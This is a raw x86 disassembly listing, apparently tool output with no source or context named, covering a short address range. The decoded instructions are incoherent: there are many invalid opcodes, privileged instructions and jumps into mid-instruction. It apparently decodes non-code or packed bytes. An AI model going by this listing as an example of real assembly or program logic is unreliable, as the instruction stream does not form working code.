  4315fa:	add    esp,ecx
  4315fc:	push   eax
  4315fd:	inc    DWORD PTR [ebp-0x75]
  431600:	add    eax,0x800e4
  431605:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43160b:	mov    DWORD PTR [ecx],eax
  43160d:	sbb    al,0x0
  43160f:	leave  
  431610:	test   DWORD PTR [edi-0x2],eax
  431613:	jne    0x431614
  431615:	call   0xff44001a
  43161a:	xor    BYTE PTR [ebp+0x4d],al
  43161d:	mov    edi,edi
  43161f:	enter  0x8,0x4d
  431623:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431629:	mov    eax,DWORD PTR [eax]
  43162b:	cld    
  43162c:	add    DWORD PTR [ecx],ebx
  43162e:	inc    ebp
  43162f:	dec    ebp
  431630:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431636:	inc    eax
  431637:	dec    DWORD PTR [ecx-0x270375]
  43163d:	add    BYTE PTR [ebx-0x39d72701],cl
  431643:	xchg   ecx,eax
  431644:	ret    
  431645:	add    BYTE PTR [ebp-0x830075],al
  43164b:	add    BYTE PTR [ebp-0x75],al
  43164e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431654:	lea    edi,[edi-0xc]
  431657:	add    bh,bh
  431659:	mov    edx,DWORD PTR [eax-0x7b]
  43165c:	inc    ebp
  43165d:	rdpmc  
  43165f:	jne    0x431664
  431661:	add    BYTE PTR [eax-0x75],dl
  431664:	inc    ebp
  431665:	clc    
  431666:	add    eax,0x400009
  43166b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431671:	mov    eax,DWORD PTR [ecx]
  431673:	in     al,dx
  431674:	add    dh,al
  431676:	test   ebx,eax
  431678:	inc    BYTE PTR [ebp-0xff0001]
  43167e:	add    BYTE PTR [ebp-0x43],al
  431681:	cmp    esi,0xfffffff8
  431684:	(bad)  
  431685:	push   DWORD PTR [eax]
  431687:	add    BYTE PTR [ebp-0x3a],dl
  43168a:	test   ebx,eax
  43168c:	je     0x431613
  43168e:	mov    edi,edi
  431690:	sbb    al,0xff
  431692:	test   DWORD PTR gs:[eax],eax
  431695:	(bad)  
  431696:	js     0x431697
  431698:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43169e:	sub    eax,ebx
  4316a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316a6:	add    eax,DWORD PTR [eax]
  4316a8:	dec    ebp
  4316a9:	push   eax
  4316aa:	mov    al,BYTE PTR [ebp+0x1]
  4316ad:	mov    eax,DWORD PTR [ebp-0x68]
  4316b0:	mov    eax,DWORD PTR [eax]
  4316b2:	sbb    bh,al
  4316b4:	or     ah,dh
  4316b6:	dec    ebp
  4316b7:	inc    DWORD PTR [eax+0x4]
  4316ba:	push   ecx
  4316bb:	add    BYTE PTR [edx-0x1],dh
  4316be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316d4:	push   ecx
  4316d5:	cmp    BYTE PTR [ebx],al
  4316d7:	inc    ebp
  4316d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316de:	(bad)  
  4316df:	(bad)  
  4316e0:	in     al,0xff
  4316e2:	add    BYTE PTR [ebp+0x0],al
  4316e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316eb:	add    al,bh
  4316ed:	(bad)  
  4316ee:	jmp    0x8d85:0x74b0558d
  4316f5:	dec    DWORD PTR [eax]
  4316f7:	call   DWORD PTR [ebp-0x7b]
  4316fa:	mov    edi,esi
  4316fc:	lock call DWORD PTR [ebp-0x75]
  431700:	mov    esi,esp
  431702:	mov    ah,0xc6
  431704:	mov    bh,0xc3
  431706:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43170c:	add    DWORD PTR [eax],0x450050ff
  431712:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431718:	inc    edi
  43171a:	push   esp
  43171c:	jmp    0xcd00:0x650481ff
  431723:	mov    DWORD PTR [ebx],esi
  431725:	clc    
  431726:	cmp    edi,0xff9cff3c
  43172c:	jne    0x431736
  43172e:	mov    eax,eax
  431730:	add    esi,DWORD PTR [eax]
  431732:	int3   
  431733:	inc    ebp
  431734:	cmp    al,0x83
  431736:	add    BYTE PTR [eax],bl
  431738:	adc    DWORD PTR [ebx+0x768b5055],eax
  43173e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431744:	mov    edi,eax
  431746:	cmp    BYTE PTR [ebp+0x45],cl
  431749:	jmp    0x4316d6
  43174b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43174e:	inc    ebp
  43174f:	or     al,0x2
  431751:	dec    DWORD PTR [ebp+0x18]
  431754:	jne    0x4317ab
  431756:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43175c:	mov    edi,DWORD PTR [ebx]
  43175e:	in     al,0x50
  431760:	xchg   ecx,eax
  431761:	jmp    0x3436666
  431766:	adc    al,0x8b
  431768:	inc    ebp
  431769:	mov    al,ds:0x8b04008b
  43176e:	push   ebp
  43176f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431775:	push   ebp
  431776:	test   DWORD PTR [ebx-0x2800d701],ecx
  43177c:	inc    ebp
  43177d:	dec    ebp
  43177e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431784:	mov    DWORD PTR [eax],0xe9ff00f4
  43178a:	add    al,0x0
  43178c:	add    BYTE PTR [eax],al
  43178e:	mov    eax,edx
  431790:	push   eax
  431791:	rol    DWORD PTR [ebp-0xf0177],1
  431797:	bound  eax,QWORD PTR [ebp+0x50]
  43179a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317a6:	mov    al,0xf
  4317a8:	test   DWORD PTR [edx],edx
  4317aa:	call   DWORD PTR [ebp-0x7a0001]
  4317b0:	(bad)  
  4317b1:	loop   0x4317b2
  4317b3:	jnp    0xc6990bb9
  4317b9:	mov    eax,ebx
  4317bb:	cmp    al,0x8b
  4317bd:	(bad)  
  4317be:	cld    
  4317bf:	shr    esi,0xc
  4317c2:	add    dl,al
  4317c4:	push   eax
  4317c5:	lea    eax,[ebp-0x1]
  4317c8:	mov    edx,esi
  4317ca:	cwde   
  4317cb:	cli    
  4317cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317d2:	or     BYTE PTR [eax],cl
  4317d4:	inc    ebp
  4317d5:	dec    ebp
  4317d6:	inc    DWORD PTR [ebx+0x74803914]
  4317dc:	add    DWORD PTR [ebx+0x451800],ecx
  4317e2:	call   DWORD PTR [eax+edx*1]
  4317e5:	add    ecx,DWORD PTR [ebp-0x34]
  4317e8:	push   edi
  4317e9:	adc    al,0x8
  4317eb:	mov    edx,DWORD PTR [ebp-0x14]
  4317ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4317f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4317f5:	inc    DWORD PTR [eax+esi*8]
  4317f8:	inc    ebp
  4317f9:	stos   BYTE PTR es:[edi],al
  4317fa:	mov    edx,DWORD PTR [ebp-0x4]
  4317fd:	add    DWORD PTR [ebp-0x1c],eax
  431800:	mov    edx,DWORD PTR [ebp-0x70]
  431803:	cmp    eax,DWORD PTR [eax]
  431805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431806:	mov    eax,DWORD PTR [eax]
  431808:	cld    
  431809:	jae    0x43178b
  43180b:	add    eax,DWORD PTR [ecx]
  43180d:	clc    
  43180e:	add    BYTE PTR [eax+0x30],dl
  431811:	mov    DWORD PTR [ecx],esi
  431813:	clc    
  431814:	pop    ds
  431815:	inc    ebp
  431816:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43181c:	(bad)  
  43181d:	push   DWORD PTR [edi]
  43181f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431825:	(bad)  
  431826:	jae    0x431827
  431828:	mov    eax,DWORD PTR [ebp-0x740175]
  43182e:	sub    eax,DWORD PTR [eax]
  431830:	add    eax,DWORD PTR [eax]
  431832:	mov    DWORD PTR [ecx+0x5f],eax
  431835:	mov    DWORD PTR [ebx-0x4],ebx
  431838:	ret    0xff
  43183b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431841:	ret    
  431842:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431848:	add    BYTE PTR [ebp-0x7d],al
  43184b:	mov    DWORD PTR [eax],eax
  43184d:	add    al,0x84
  43184f:	inc    DWORD PTR [ecx]
  431851:	lea    eax,[eax]
  431853:	hlt    
  431854:	sar    bh,cl
  431856:	test   BYTE PTR [eax+0x1],dl
  431859:	inc    ebp
  43185a:	add    BYTE PTR [ebx],dh
  43185c:	test   BYTE PTR [ebx],0x84
  43185f:	push   eax
  431860:	add    BYTE PTR [ebp+0x0],al
  431863:	add    eax,0x86
  431868:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43186e:	add    BYTE PTR [ecx],al
  431870:	add    BYTE PTR [eax],al
  431872:	mov    esi,0x550030
  431877:	mov    ecx,DWORD PTR [edi]
  431879:	cld    
  43187a:	fidiv  DWORD PTR [ebp+0x0]
  43187d:	mov    edi,DWORD PTR [ecx]
  43187f:	xor    BYTE PTR [eax+eax*1],0x84
  431883:	add    eax,DWORD PTR [eax]
  431885:	sbb    BYTE PTR [eax],al
  431887:	jne    0x43183a
  431889:	mov    eax,DWORD PTR [ecx]
  43188b:	sbb    BYTE PTR [eax],al
  43188d:	mov    DWORD PTR [ebp-0x1],esp
  431890:	add    BYTE PTR [eax+0x30e45ca],bh
  431896:	ret    0xb7fc
  431899:	dec    ebp
  43189a:	or     al,0x89
  43189c:	dec    ebp
  43189d:	cld    
  43189e:	cmovne ecx,DWORD PTR [eax-0x75]
  4318a2:	add    edi,esp
  4318a4:	seto   BYTE PTR [esi-0x72ffffff]
  4318ab:	inc    ebp
  4318ac:	adc    al,0x8b
  4318ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318b5:	cmp    DWORD PTR [edi+0x72],edx
  4318b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318be:	gs cmp al,0x0
  4318c1:	je     0x431899
  4318c3:	push   eax
  4318c4:	sar    BYTE PTR [eax],1
  4318c6:	mov    bh,0x3e
  4318c8:	push   cs
  4318c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318cf:	add    DWORD PTR [ecx+0x12],ebp
  4318d2:	dec    edx
  4318d3:	(bad)  
  4318d4:	mov    eax,edx
  4318d6:	in     al,dx
  4318d7:	adc    DWORD PTR [ecx],esi
  4318d9:	pop    esi
  4318da:	inc    ecx
  4318db:	leave  
  4318dc:	or     DWORD PTR [eax],ebx
  4318de:	gs push ebp
  4318e0:	add    ah,ch
  4318e2:	into   
  4318e3:	in     al,dx
  4318e4:	enter  0xb756,0xf0
  4318e8:	push   cs
  4318e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4318f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4318f9:	jnp    0x74439e01
  4318ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431905:	add    BYTE PTR [edi],cl
  431907:	mov    edi,DWORD PTR [ecx-0x78]
  43190a:	ltr    WORD PTR [ecx-0x7b]
  43190e:	dec    DWORD PTR [edi]
  431910:	clc    
  431911:	out    0x45,eax
  431913:	add    BYTE PTR [eax],cl
  431915:	cmp    ebx,0xffffff8c
  431918:	jge    0x43191a
  43191a:	jb     0x43192c
  43191c:	je     0x52199c
  431922:	pop    edx
  431923:	push   esi
  431924:	mov    ecx,DWORD PTR [edi]
  431926:	in     al,dx
  431927:	rol    DWORD PTR [ebp+0x0],1
  43192a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431931:	cmp    DWORD PTR [ecx],0xfffffff0
  431934:	hlt    
  431935:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43193b:	(bad)  
  43193d:	push   eax
  43193e:	jns    0xb842fdbc
  431944:	lock push cs
  431946:	ror    edx,0x3
  431949:	test   BYTE PTR [ecx+0x5500e800],cl
  43194f:	dec    eax
  431950:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431954:	(bad)  
  431955:	mov    esi,0x7f33ff5f
  43195a:	inc    eax
  43195b:	test   DWORD PTR [edx],eax
  43195d:	je     0x43191f
  43195f:	mov    ecx,ecx
  431961:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431965:	and    eax,DWORD PTR [eax+0xf0103]
  43196b:	jp     0x431959
  43196d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431971:	add    edx,DWORD PTR [edi+0x74]
  431974:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43197a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431980:	je     0x431905
  431982:	cmp    eax,edi
  431984:	js     0x4319a9
  431986:	add    eax,0xeb0fc003
  43198b:	jns    0x431918
  43198d:	vmread DWORD PTR [ecx+0x45],ebx
  431991:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431997:	adc    al,0x8b
  431999:	jge    0x4319af
  43199b:	mov    edi,DWORD PTR [eax-0x4]
  43199e:	add    edi,DWORD PTR [edi]
  4319a0:	or     bh,bh
  4319a2:	push   ebp
  4319a3:	push   es
  4319a4:	mov    DWORD PTR [ebp-0x4],ebx
  4319a7:	add    edi,esi
  4319a9:	pop    es
  4319aa:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319b0:	mov    DWORD PTR [esp+esi*8],ecx
  4319b3:	inc    ebp
  4319b4:	pop    ebp
  4319b5:	xor    DWORD PTR [esi-0x4],0x3b
  4319b9:	add    edx,DWORD PTR [ecx+edi*1]
  4319bc:	push   es
  4319bd:	clc    
  4319be:	mov    bh,0xdb
  4319c0:	jp     0x431979
  4319c2:	add    cl,BYTE PTR [esi]
  4319c4:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319ca:	test   edi,edi
  4319cc:	je     0x4319c2
  4319ce:	mov    eax,ecx
  4319d0:	or     BYTE PTR [ebx],al
  4319d2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319d8:	jbe    0x431a4c
  4319da:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319e0:	add    ecx,DWORD PTR [esi]
  4319e2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319e8:	add    eax,DWORD PTR [ebx-0x287af783]
  4319ee:	je     0x431a3d
  4319f0:	mov    DWORD PTR [ecx],edi
  4319f2:	mov    esi,eax
  4319f4:	hlt    
  4319f5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4319fc:	jb     0x4319be
  4319fe:	jmp    0x4319eb
  431a00:	xor    esi,DWORD PTR [ebx]
  431a02:	pop    edi
  431a03:	pop    esi
  431a04:	pop    ebx
  431a05:	ret    
  431a06:	ret    0x8b
  431a09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a0f:	xor    DWORD PTR [ecx],0xc
  431a12:	pushf  
  431a13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a19:	rdmsr  
  431a1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a22:	dec    ebp
  431a23:	ret    
  431a24:	mov    edi,DWORD PTR [esi-0x4]
  431a27:	pop    eax
  431a28:	dec    ebp
  431a29:	jne    0x4319b6
  431a2b:	xor    edi,esp
  431a2d:	inc    eax
  431a2e:	dec    ebp
  431a2f:	jbe    0x431a84
  431a31:	inc    eax
  431a32:	pop    ebp
  431a33:	add    edx,DWORD PTR [esi+0x8]
  431a36:	push   esp
  431a37:	dec    eax
  431a38:	push   ecx
  431a39:	mov    eax,edi
  431a3b:	and    al,0xf0
  431a3d:	jo     0x431a2a
  431a3f:	mov    eax,DWORD PTR [ebx]
  431a41:	sbb    BYTE PTR [ebp+0x4d],cl
  431a44:	mov    eax,DWORD PTR [ebx]
  431a46:	nop
  431a47:	or     BYTE PTR [eax],al
  431a49:	jne    0x431aa2
  431a4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a51:	cld    
  431a52:	xor    edi,edi
  431a54:	add    edi,DWORD PTR [ebp+0x3]
  431a57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a5d:	js     0x4319e3
  431a5f:	jae    0x431a63
  431a61:	(bad)  
  431a63:	xor    al,0x5d
  431a65:	jmp    0x4319f2
  431a67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a6e:	fdecstp 
  431a70:	test   BYTE PTR [edi],ah
  431a72:	add    bh,BYTE PTR [ebp+0x0]
  431a75:	add    ebx,DWORD PTR [ebp-0x77]
  431a78:	mov    edi,eax
  431a7a:	cmp    al,0x0
  431a7d:	adc    dh,BYTE PTR [ebx]
  431a7f:	jge    0x431a84
  431a81:	mov    edi,DWORD PTR [ebx]
  431a83:	jl     0x431a94
  431a85:	clc    
  431a86:	dec    edi
  431a87:	jge    0x431a89
  431a89:	mov    eax,DWORD PTR [ebx]
  431a8b:	jb     0x431a95
  431a8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431a90:	mov    edi,edi
  431a92:	xor    edx,DWORD PTR [eax]
  431a94:	add    edi,DWORD PTR [ebx]
  431a96:	mov    DWORD PTR [ebp-0x10],edi
  431a99:	inc    edi
  431a9a:	pop    ebp
  431a9b:	jge    0x431ad8
  431a9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431aa1:	mov    edx,0xc05d87f0
  431aa6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aaa:	fimul  WORD PTR [eax]
  431aac:	fist   WORD PTR [ebp+0x1c]
  431aaf:	in     al,dx
  431ab0:	jne    0x431a9e
  431ab2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431ab8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431abc:	fdivp  st(0),st
  431abe:	fild   WORD PTR [ebp+0x4510f85c]
  431ac4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431aca:	inc    ebp
  431acb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ad1:	mov    ebp,DWORD PTR [ebx-0x4]
  431ad4:	adc    al,0x8b
  431ad6:	rcl    DWORD PTR [eax],0x48
  431ad9:	mov    esi,0x7080803
  431ade:	fiadd  WORD PTR [ebp+0x4d]
  431ae1:	(bad)  
  431ae2:	mov    edx,DWORD PTR [edx-0x4]
  431ae5:	mov    edx,DWORD PTR [ebp-0x4]
  431ae8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431aee:	mov    DWORD PTR [edi+0x872dc],edi
  431af4:	xlat   BYTE PTR ds:[ebx]
  431af5:	into   
  431af6:	ffreep st(6)
  431af8:	retf   0x6c7
  431afb:	iret   
  431afc:	dec    ebp
  431afd:	inc    ebp
  431afe:	mov    DWORD PTR [ebx],edi
  431b00:	fmul   QWORD PTR [edi]
  431b02:	dec    ebp
  431b03:	jnp    0x431b38
  431b05:	add    BYTE PTR [ebx],al
  431b07:	mov    ecx,DWORD PTR [esp+edi*8]
  431b0a:	inc    ebp
  431b0b:	dec    ebp
  431b0c:	lea    esi,[ebx]
  431b0e:	add    DWORD PTR [ebx],eax
  431b10:	jb     0x431b4d
  431b12:	add    BYTE PTR [edi],cl
  431b14:	inc    ebp
  431b15:	imul   eax,edi,0x858bd800
  431b1b:	cld    
  431b1c:	clc    
  431b1d:	mov    DWORD PTR [ebp+0x0],eax
  431b20:	inc    DWORD PTR [eax]
  431b22:	or     al,0xde
  431b24:	sbb    bh,0x1
  431b27:	retf   
  431b28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b2f:	dec    ebp
  431b30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b36:	enter  0x12de,0xdf
  431b3a:	inc    ebp
  431b3b:	pop    ebp
  431b3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b42:	add    DWORD PTR [edx],edx
  431b44:	add    BYTE PTR [ebp+0x50],dl
  431b47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b53:	or     ah,al
  431b55:	pop    ss
  431b56:	cdq    
  431b57:	push   ebp
  431b58:	clc    
  431b59:	mov    eax,DWORD PTR [ebp-0x4]
  431b5c:	xor    edx,edx
  431b5e:	add    esi,DWORD PTR [ebx]
  431b60:	cmp    eax,DWORD PTR [ebx]
  431b62:	hlt    
  431b63:	cmp    DWORD PTR [ebx],esp
  431b65:	or     al,BYTE PTR [ebp+0xf]
  431b68:	mov    eax,DWORD PTR [edx]
  431b6a:	loopne 0x431b6c
  431b6c:	(bad)  
  431b6d:	mov    ecx,esi
  431b6f:	cld    
  431b70:	pushf  
  431b71:	pop    ebp
  431b72:	fwait
  431b73:	mov    esi,DWORD PTR [edx]
  431b75:	lock mov eax,eax
  431b78:	adc    BYTE PTR [ebx],al
  431b7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b87:	dec    ebp
  431b88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431b8e:	(bad)  
  431b8f:	iret   
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	jne    0x431be1
  431b94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431b9a:	(bad)  
  431b9b:	cmp    ebx,eax
  431b9d:	je     0x431b25
  431b9f:	add    edi,edi
  431ba1:	or     bh,bh
  431ba3:	dec    ebp
  431ba4:	inc    ebp
  431ba5:	mov    esi,DWORD PTR [ebx]
  431ba7:	cld    
  431ba8:	add    ecx,esi
  431baa:	cmp    ecx,DWORD PTR [eax-0xc]
  431bad:	mov    edx,DWORD PTR [edi]
  431baf:	or     BYTE PTR [ebp-0x7c],al
  431bb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bb8:	test   BYTE PTR [ebx+ebx*4],cl
  431bbb:	inc    ebp
  431bbc:	xor    bh,BYTE PTR [esi]
  431bbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bc5:	jne    0x431b8e
  431bc7:	mov    ebp,esp
  431bc9:	fcomp  DWORD PTR [ebx]
  431bcb:	add    BYTE PTR [ecx],al
  431bcd:	inc    DWORD PTR [ebp-0x75]
  431bd0:	(bad)  
  431bd1:	cld    
  431bd2:	add    al,0xce
  431bd4:	mov    ecx,edi
  431bd6:	cld    
  431bd7:	inc    ebp
  431bd8:	fidivr WORD PTR [ebx]
  431bda:	fbstp  TBYTE PTR [ebp-0x3e]
  431bdd:	mov    eax,DWORD PTR [eax]
  431bdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431be5:	fadd   st,st(7)
  431be7:	add    BYTE PTR [ebp-0x1],al
  431bea:	mov    ecx,DWORD PTR [esp+edi*8]
  431bed:	inc    ebp
  431bee:	mov    bh,0xc7
  431bf1:	loopne 0x431c38
  431bf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431bf9:	sbb    dh,BYTE PTR [ebx]
  431bfb:	pushf  
  431bfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c02:	mov    eax,edi
  431c04:	cwde   
  431c05:	inc    ebp
  431c06:	inc    ebp
  431c07:	jne    0x431b94
  431c09:	mov    esp,esp
  431c0b:	clc    
  431c0c:	add    al,0x4d
  431c0e:	mov    DWORD PTR [ebx],esi
  431c10:	or     al,0x33
  431c12:	inc    ebp
  431c13:	lea    ecx,[ebx-0x398d13fd]
  431c19:	add    bh,al
  431c1b:	inc    ebp
  431c1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c23:	add    ebp,esp
  431c25:	shufps xmm1,xmm3,0xc7
  431c29:	(bad)  
  431c2a:	jmp    0x74885753
  431c2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c35:	hlt    
  431c36:	mov    ecx,DWORD PTR [edi]
  431c38:	fadd   DWORD PTR [ebp+0x0]
  431c3b:	xor    ecx,DWORD PTR [edi]
  431c3d:	add    ecx,ecx
  431c3f:	cmp    edi,edi
  431c41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c45:	(bad)  
  431c46:	jmp    0x431bd3
  431c48:	mov    edi,esp
  431c4a:	or     al,0xc6
  431c4c:	inc    ebp
  431c4d:	(bad)  
  431c4e:	mov    eax,DWORD PTR [ebp+0x10]
  431c51:	jne    0x431bdc
  431c53:	mov    eax,DWORD PTR [ecx]
  431c55:	clc    
  431c56:	add    BYTE PTR [ebp-0x40],cl
  431c59:	xor    edx,DWORD PTR [eax-0x73]
  431c5c:	jne    0x431c5f
  431c5e:	push   DWORD PTR [edx+0x8]
  431c61:	add    BYTE PTR [ebp+0x45],al
  431c64:	mov    ebp,ecx
  431c66:	cld    
  431c67:	add    BYTE PTR [ebp+0x0],cl
  431c6a:	xor    eax,DWORD PTR [ebp+0x3]
  431c6d:	mov    DWORD PTR [ebx],edi
  431c6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c75:	sub    eax,0x5d330e4d
  431c7a:	lea    esi,[ebx]
  431c7c:	add    DWORD PTR [ebx],eax
  431c7e:	jb     0x431c69
  431c80:	add    BYTE PTR [eax],al
  431c82:	inc    ebp
  431c83:	add    bl,ch
  431c85:	inc    ebp
  431c86:	mov    esi,DWORD PTR [ebx]
  431c88:	or     al,0x3
  431c8a:	(bad)  
  431c8b:	mov    edi,eax
  431c8d:	in     al,dx
  431c8e:	scas   eax,DWORD PTR es:[edi]
  431c8f:	inc    ebp
  431c90:	mov    esi,DWORD PTR [ebx]
  431c92:	in     al,0x3
  431c94:	add    al,0x89
  431c96:	mov    ecx,DWORD PTR [eax+edi*8]
  431c99:	dec    ebp
  431c9a:	(bad)  
  431c9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431ca2:	mov    ecx,eax
  431ca4:	cld    
  431ca5:	push   es
  431ca6:	dec    ebp
  431ca7:	add    al,0x33
  431ca9:	mov    DWORD PTR [ebx],eax
  431cab:	in     al,dx
  431cac:	cmp    DWORD PTR [ebp-0x67],eax
  431caf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cb5:	mov    edx,DWORD PTR [ebp-0x4]
  431cb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cbb:	xor    eax,DWORD PTR [ebp+0x3]
  431cbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431cc4:	xor    edi,esp
  431cc6:	jmp    0xff771a18
  431ccb:	add    ecx,DWORD PTR [ebp-0x3f]
  431cce:	xor    ebx,DWORD PTR [edi]
  431cd0:	add    eax,ecx
  431cd2:	cmp    ebx,DWORD PTR [eax]
  431cd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431cd7:	mov    ecx,DWORD PTR [eax]
  431cd9:	adc    BYTE PTR [ebp-0x80],al
  431cdc:	jmp    0x431cdf
  431cde:	mov    eax,DWORD PTR [eax]
  431ce0:	cld    
  431ce1:	mov    bh,0xc6
  431ce3:	push   ecx
  431ce4:	(bad)  
  431ce5:	jne    0x431d45
  431ce7:	dec    ecx
  431ce9:	or     BYTE PTR [ecx+ebx*1],cl
  431cec:	push   ebp
  431ced:	inc    ebp
  431cee:	in     al,dx
  431cef:	add    ebp,esp
  431cf1:	or     bh,al
  431cf3:	dec    ebp
  431cf4:	cld    
  431cf5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431cfb:	xor    DWORD PTR [edx],0x2
  431cfe:	pushf  
  431cff:	dec    DWORD PTR [ebx+0x45510cf4]
  431d05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d0b:	mov    edx,DWORD PTR [ecx+0xc]
  431d0e:	xor    eax,esi
  431d10:	mov    edx,0xc172c7
  431d15:	inc    ebp
  431d16:	mov    esi,DWORD PTR [ebp+0x8]
  431d19:	mov    eax,edx
  431d1b:	call   0x84c7e410
  431d20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d26:	mov    ebp,eax
  431d28:	or     BYTE PTR [eax],dl
  431d2a:	jo     0x431d79
  431d2c:	push   edi
  431d2d:	xor    esi,DWORD PTR [ebp+0x3]
  431d30:	(bad)  
  431d31:	pmulhuw mm0,mm1
  431d34:	test   DWORD PTR [ebp-0x8],ecx
  431d37:	mov    DWORD PTR [ebp-0x67],eax
  431d3a:	mov    eax,DWORD PTR [ebp-0x4]
  431d3d:	xor    edi,DWORD PTR [ebp-0x73]
  431d40:	xor    eax,DWORD PTR [ebx]
  431d42:	xor    esi,DWORD PTR [edx+0x3]
  431d45:	add    BYTE PTR [ecx],bh
  431d47:	inc    ebp
  431d48:	(bad)  
  431d49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d4f:	mov    DWORD PTR [eax],0x750f0004
  431d55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d5b:	lock add BYTE PTR [ebp+0x0],cl
  431d5f:	mov    esi,DWORD PTR [ebp-0x18]
  431d62:	mov    ebp,edx
  431d64:	or     al,0x72
  431d66:	ja     0x431d68
  431d68:	mov    edx,esi
  431d6a:	cld    
  431d6b:	(bad)  
  431d6e:	cli    
  431d6f:	mov    esi,DWORD PTR [ebp-0x4]
  431d72:	cmp    ecx,esi
  431d74:	bswap  edi
  431d76:	(bad)
  431d7a:	mov    esi,DWORD PTR [ebp-0x4]
  431d7d:	mov    esi,ecx
  431d7f:	clc    
  431d80:	repnz add esi,DWORD PTR [ebp+0x45]
  431d84:	push   ebx
  431d85:	xor    eax,DWORD PTR [ebp+0x3]
  431d88:	cmp    al,0x5f
  431d8a:	pushf  
  431d8b:	pop    ebx
  431d8c:	jmp    0x431e53
  431d91:	mov    esi,DWORD PTR [ebp-0x7d]
  431d94:	xor    ebp,DWORD PTR [eax]
